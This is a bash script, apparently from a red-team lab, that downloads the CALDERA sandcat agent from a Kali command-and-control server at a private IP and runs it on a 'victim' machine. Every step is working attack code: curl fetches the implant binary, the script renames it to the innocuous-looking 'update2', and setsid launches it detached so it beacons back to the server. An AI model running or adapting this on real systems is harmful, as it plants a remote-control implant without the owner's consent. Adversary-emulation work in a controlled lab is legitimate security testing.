#!/usr/bin/env bash
# deploy-agent.sh [NAME] [KALI_IP]
# Download + launch the CALDERA sandcat agent (arm64/linux), robustly. Run ON a victim.
# NAME = agent file name (rename per run for S15); default update2. KALI_IP default 192.168.64.8.
set -u
NAME="${1:-update2}"
SERVER="http://${2:-192.168.64.8}:8888"

pkill -f "$NAME" 2>/dev/null || true
rm -f "$NAME"
curl -sS -X POST -H "file:sandcat.go" -H "platform:linux" -H "architecture:arm64" \
     "$SERVER/file/download" -o "$NAME"
if ! file "$NAME" 2>/dev/null | grep -q ELF; then
  echo "DOWNLOAD FAILED — not an ELF binary:"; file "$NAME" 2>/dev/null; exit 1
fi
chmod +x "$NAME"
setsid "./$NAME" -server "$SERVER" -group red -v >/tmp/agent.log 2>&1 &
sleep 3
if pgrep -fl "$NAME" >/dev/null; then
  echo "OK: agent '$NAME' running — $(pgrep -fl "$NAME" | head -1)"
else
  echo "agent exited; last log lines:"; tail -5 /tmp/agent.log 2>/dev/null
  exit 1
fi
